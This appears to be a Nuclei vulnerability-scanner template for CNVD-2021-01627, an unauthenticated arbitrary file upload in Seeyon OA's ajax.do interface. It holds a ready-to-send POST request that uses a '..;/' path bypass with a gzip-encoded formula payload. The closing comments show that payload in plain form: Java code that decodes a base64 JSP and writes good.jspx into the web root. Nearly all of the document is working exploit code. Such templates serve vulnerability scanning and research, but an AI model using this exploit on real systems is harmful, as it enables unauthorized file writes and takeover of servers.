id: zhiyuanOA-ajaxdo-file-upload

info:
  name: 致远OA ajax.do 任意文件上传 CNVD-2021-01627
  author: cnaq
  severity: high  
  description: 由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627.html
  tags: zhiyuanOA,file,upload

requests:
  - raw:
      - |
        POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        managerMethod=validate&arguments=%1F%C2%8B%08%00%27%C2%8F%C3%97c%00%C3%BFu%C2%92Os%C2%9B0%10%C3%85%C3%8F%C3%AD%C2%A7%C3%90p%C3%81%C2%9E%C2%A6r%C3%A2%28m%C3%9AL%0E%21q%18%C3%9A%40%C2%9D%C2%9A%C2%9A%C3%90N%0FB%C3%88%C2%B1%5C%C2%90T%24%C3%82%C2%9FL%C2%BE%7B%C2%84%C2%A1%C2%B5g%C2%9ArY%C2%BDe%C3%B77%C3%BBv%C3%B6%C3%87%C2%A3%C2%BD%12E%5Ef8l%24%C2%B5%3F%C2%82%C2%A3%03%C3%B0%27%13%C3%A0%C2%BC%C3%8B%C3%98%C2%9A%2Am%C3%AF%C3%92%C2%B3Z%16T%29%26x%C3%B7s%C2%A1%0B%C3%86%C3%AF%C2%81%C3%84z%0D%C3%8E%C2%81%05%C3%A1%C2%A4%C2%A2%09%C2%96RM%14%C2%A5%C2%8D%C3%A0%13%C3%AB%C3%AC5%C3%A8%C2%BFW%1B%C3%BC%C2%80%21%13pnZtT0M%0B%20w%C3%AF%C2%A9%01pZ%C2%81%17%C3%8AF%1D%C3%BF%C2%8Du%2FD%0A7J%C3%96%C3%96%C3%B8%2F%15%0C%13%C2%A85%C3%8D%C2%B2n%C2%84%C3%B9%C3%A5%C3%B2%C2%82%C2%B8%C3%97%C3%BC%C3%BB%C3%82%C2%91%C3%89%C2%9D%C3%B3%40%C3%B8%C3%AD%07%2F%C2%97%C3%AB4%C2%9F%C2%95%C2%A9%C2%BBD%C3%A9%25%C3%BA%7D%C3%A3%0E%C3%BA%C3%AE%C2%ABL%C3%B64%C2%8EN%C3%8B%C3%8F%C3%8C%C3%8B%C3%A6%C2%9B%2AK%C2%8E%C2%97%C2%877%C3%9Ciptr%C2%98%C2%B8Hx%1Br%14D1%0A%22%C2%BF%09Z%C2%AF%C2%8Ds%C2%AF%C3%BD%12%C3%BA%C3%88%C2%8F%C3%BCc%C2%BF%25%27q%18W%C3%81%C3%95l%C3%AA%C2%BB%C2%B7%C3%88c%C2%BF%C3%9E%7F%0A%C3%91%C3%B9%C3%8E%3CP%25%C2%879S%04%3A%17%C2%8B%C3%99%3BtE%C2%89H%C2%8D%C3%BFt%C2%88%C2%BD%C3%B5%C2%97%C2%8BF%C3%BF%C2%BA%C3%AD%C3%9B%06%C3%91%C3%B7%C3%B6b4%00a%1F%C2%9Dr%C2%B52%C2%80%C3%ADr%C3%86%07%C3%96%C2%B7%C3%B0%C3%BA%C3%AD%C3%A9%C3%BE%C3%B2%C3%B6%C3%97%0F%C2%B7%22%C3%A3%03%C2%A2%C3%A7%C3%BD%C2%AF%C2%96dBQ3%C3%98%C3%93Yw%1E%C3%A6%C2%91%C3%92%15P%1AkF%40%5D%C3%97%C2%A3%C3%B1%C3%A3%C2%939%19s6%C3%9B%C2%A8%C2%8B%C2%92%C3%9A%3F%C2%9F%01w%C3%A7Z%3Dm%02%00%00
      
    matchers-condition: and  
    matchers:
      - type: status
        status:
          - 500

      - type: word
        condition: and
        part: body
        words:
          - '"message":null,'

# 将以下代码 gzip+url # 访问地址 /seeyon/good.jspx
# [{'formulaType': 1, 'formulaName': 'test', 'formulaExpression': 'String path = "../webapps/seeyon/";
#         java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"good.jspx");
#         String shell = "PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPjwlb3V0LnByaW50bG4oIjc1NWY4NWMyNzIzYmIzOTM4MWM3Mzc5YTYwNDE2MGQ4Iik7JT4=";
#         sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
#         String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
#         printWriter2.println(decodeString);
#         printWriter2.close();};test();def static xxx(){}, '', {}, 'true']